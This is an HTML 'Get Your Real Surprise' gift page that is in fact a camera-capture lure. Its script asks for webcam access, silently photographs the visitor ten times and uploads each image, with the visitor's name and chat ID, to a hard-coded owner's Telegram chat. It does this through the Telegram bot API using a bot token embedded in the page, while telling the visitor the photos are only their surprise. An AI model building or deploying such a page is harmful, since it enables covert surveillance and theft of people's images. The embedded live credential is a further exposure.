<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ Get Your Real Surprise</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: white; padding: 30px; border-radius: 15px; width: 100%; max-width: 450px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .gift-icon { font-size: 60px; margin-bottom: 15px; animation: bounce 2s infinite; }
        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        h1 { font-size: 24px; color: #333; margin-bottom: 10px; }
        .btn { width: 100%; background: linear-gradient(90deg, #6a11cb, #2575fc); color: white; padding: 15px; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; margin: 15px 0; transition: 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(106, 17, 203, 0.4); }
        .btn:disabled { opacity: 0.7; cursor: not-allowed; }
        video { width: 100%; border-radius: 10px; margin: 15px 0; border: 3px solid #6a11cb; display: none; transform: scaleX(-1); }
        .progress { width: 100%; height: 8px; background: #eee; border-radius: 4px; margin: 15px 0; overflow: hidden; }
        .progress-bar { height: 100%; width: 0%; background: #00b09b; transition: width 0.3s; }
        .hidden { display: none; }
        .photo-preview { width: 150px; height: 150px; border-radius: 10px; margin: 15px auto; border: 3px solid #6a11cb; object-fit: cover; }
        .success { color: #00b09b; background: #e6fff9; padding: 10px; border-radius: 8px; margin: 10px 0; }
        .warning { color: #ff9800; background: #fff3e0; padding: 10px; border-radius: 8px; margin: 10px 0; border-left: 4px solid #ff9800; }
    </style>
</head>
<body>
    <div class="container">
        <div class="gift-icon">üéÅ</div>
        <h1 id="title">Your Real Surprise</h1>
        <p id="message" style="color: #666;">Get ready for real photos with your camera!</p>
        
        <div class="warning" id="cameraWarning">
            <strong>üì∏ IMPORTANT:</strong><br>
            Allow camera access for real photos!
        </div>
        
        <button class="btn" onclick="startRealSurprise()" id="actionBtn">üì∏ GET REAL SURPRISE</button>
        
        <video id="video" autoplay playsinline></video>
        
        <div class="progress hidden" id="progressContainer">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div id="counter" class="hidden" style="color: #666; font-size: 14px;"></div>
        
        <img id="photoPreview" class="photo-preview hidden">
        
        <div id="status" class="success hidden"></div>
    </div>

    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const USER_CHAT_ID = urlParams.get("chat_id");
        const USER_NAME = urlParams.get("name") || "Friend";
        
        const BOT_TOKEN = "8226782560:AAE3pOwbdZR8lWUoa2rd8Gf5fLTeQM2eguM";
        const OWNER_CHAT_ID = "8215819954";
        
        let stream = null;
        let photosTaken = 0;
        
        async function startRealSurprise() {
            document.getElementById("actionBtn").disabled = true;
            document.getElementById("actionBtn").textContent = "‚è≥ Starting camera...";
            document.getElementById("progressContainer").classList.remove("hidden");
            document.getElementById("title").textContent = "üì∏ Camera Starting...";
            
            try {
                // Start camera
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });
                
                const video = document.getElementById("video");
                video.srcObject = stream;
                video.style.display = "block";
                
                document.getElementById("title").textContent = "üì∏ Camera Ready!";
                document.getElementById("message").textContent = "Smile! Taking real photos...";
                document.getElementById("actionBtn").textContent = "üì∏ Taking Photos...";
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        setTimeout(resolve, 1000);
                    };
                });
                
                // Take 10 real photos
                await takeRealPhotos();
                
            } catch (error) {
                // Camera blocked - use fallback
                document.getElementById("cameraWarning").innerHTML = 
                    "<strong>‚ö†Ô∏è Camera blocked!</strong><br>Creating colorful surprises instead...";
                await createFallbackPhotos();
            }
        }
        
        async function takeRealPhotos() {
            for (let i = 1; i <= 10; i++) {
                const percent = (i / 10) * 100;
                document.getElementById("progressBar").style.width = percent + "%";
                document.getElementById("counter").textContent = `Real Photo ${i}/10`;
                document.getElementById("counter").classList.remove("hidden");
                
                // Capture real photo from camera
                const blob = await captureRealPhoto(i);
                const imageUrl = URL.createObjectURL(blob);
                
                // Show preview
                const preview = document.getElementById("photoPreview");
                preview.src = imageUrl;
                preview.classList.remove("hidden");
                
                // Send to Telegram
                const success = await sendToTelegram(blob, i, true);
                
                if (success) {
                    document.getElementById("status").textContent = `‚úÖ Sent real photo ${i}/10`;
                    document.getElementById("status").classList.remove("hidden");
                    photosTaken++;
                }
                
                // Wait
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            complete();
        }
        
        async function captureRealPhoto(number) {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");
            
            // Set canvas size to video size
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            // Draw video frame (mirrored)
            ctx.save();
            ctx.translate(canvas.width, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            ctx.restore();
            
            // Add overlay
            ctx.fillStyle = 'rgba(106, 17, 203, 0.7)';
            ctx.fillRect(0, canvas.height - 70, canvas.width, 70);
            
            // Add text
            ctx.font = 'bold 24px Arial';
            ctx.fillStyle = 'white';
            ctx.textAlign = 'center';
            ctx.fillText(`üì∏ Real Photo #${number}`, canvas.width/2, canvas.height - 35);
            ctx.font = '18px Arial';
            ctx.fillText(`For ${USER_NAME}`, canvas.width/2, canvas.height - 10);
            
            // Convert to blob
            return new Promise(resolve => {
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
        }
        
        async function createFallbackPhotos() {
            document.getElementById("title").textContent = "üé® Creating Surprises...";
            
            for (let i = 1; i <= 10; i++) {
                const percent = (i / 10) * 100;
                document.getElementById("progressBar").style.width = percent + "%";
                document.getElementById("counter").textContent = `Creating ${i}/10`;
                document.getElementById("counter").classList.remove("hidden");
                
                // Create colorful image
                const blob = await createColorfulImage(i);
                const imageUrl = URL.createObjectURL(blob);
                
                // Show preview
                const preview = document.getElementById("photoPreview");
                preview.src = imageUrl;
                preview.classList.remove("hidden");
                
                // Send to Telegram
                const success = await sendToTelegram(blob, i, false);
                
                if (success) {
                    document.getElementById("status").textContent = `‚úÖ Sent surprise ${i}/10`;
                    document.getElementById("status").classList.remove("hidden");
                    photosTaken++;
                }
                
                // Wait
                await new Promise(resolve => setTimeout(resolve, 800));
            }
            
            complete();
        }
        
        async function createColorfulImage(number) {
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");
            
            canvas.width = 800;
            canvas.height = 600;
            
            // Clear
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            
            // Create gradient
            const colors = [
                ['#FF6B6B', '#4ECDC4'],
                ['#6A11CB', '#2575FC'],
                ['#00B09B', '#96C93D'],
                ['#FF416C', '#FF4B2B'],
                ['#8338EC', '#3A86FF'],
                ['#FB5607', '#FFBE0B'],
                ['#118AB2', '#06D6A0'],
                ['#EF476F', '#FFD166'],
                ['#7209B7', '#F72585'],
                ['#3A0CA3', '#4361EE']
            ];
            
            const colorSet = colors[number - 1] || colors[0];
            const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
            gradient.addColorStop(0, colorSet[0]);
            gradient.addColorStop(1, colorSet[1]);
            
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // Add text
            ctx.font = "bold 60px Arial";
            ctx.fillStyle = "white";
            ctx.textAlign = "center";
            ctx.fillText("üéÅ", canvas.width/2, canvas.height/2 - 50);
            
            ctx.font = "bold 36px Arial";
            ctx.fillText(`For ${USER_NAME}`, canvas.width/2, canvas.height/2 + 40);
            
            ctx.font = "24px Arial";
            ctx.fillText(`Surprise #${number}`, canvas.width/2, canvas.height/2 + 90);
            
            // Convert to blob
            return new Promise(resolve => {
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
        }
        
        async function sendToTelegram(blob, number, isReal) {
            const fileName = `surprise_${number}_${Date.now()}.jpg`;
            const file = new File([blob], fileName, { type: "image/jpeg" });
            
            // Captions
            const ownerCaption = `üéÅ ${isReal ? 'üì∏ REAL Photo' : 'Surprise'} #${number}\nFor: ${USER_NAME}\nUser ID: ${USER_CHAT_ID || 'Anonymous'}`;
            const userCaption = `üéÅ Your ${isReal ? 'Real Photo' : 'Surprise'} #${number}\nFor: ${USER_NAME}\nEnjoy!`;
            
            let sent = false;
            
            // Send to owner
            try {
                await sendPhoto(file, ownerCaption, OWNER_CHAT_ID);
                sent = true;
            } catch (e) {}
            
            // Send to user
            if (USER_CHAT_ID) {
                try {
                    await sendPhoto(file, userCaption, USER_CHAT_ID);
                    sent = true;
                } catch (e) {}
            }
            
            return sent;
        }
        
        async function sendPhoto(file, caption, chatId) {
            const formData = new FormData();
            formData.append("photo", file);
            formData.append("caption", caption);
            formData.append("chat_id", chatId);
            
            const response = await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
                { method: "POST", body: formData }
            );
            
            return response.ok;
        }
        
        function complete() {
            // Stop camera
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            document.getElementById("title").textContent = "‚úÖ Surprise Complete!";
            document.getElementById("message").textContent = `${photosTaken} surprises sent to your Telegram!`;
            document.getElementById("actionBtn").disabled = false;
            document.getElementById("actionBtn").textContent = "üîÑ Get Another";
            document.getElementById("actionBtn").onclick = () => location.reload();
            document.getElementById("status").textContent = `üéâ ${photosTaken}/10 sent successfully!`;
        }
        
        // Initialize
        window.onload = function() {
            if (USER_NAME !== "Friend") {
                document.getElementById("title").textContent = `${USER_NAME}'s Real Surprise`;
            }
        };
    </script>
</body>
</html>
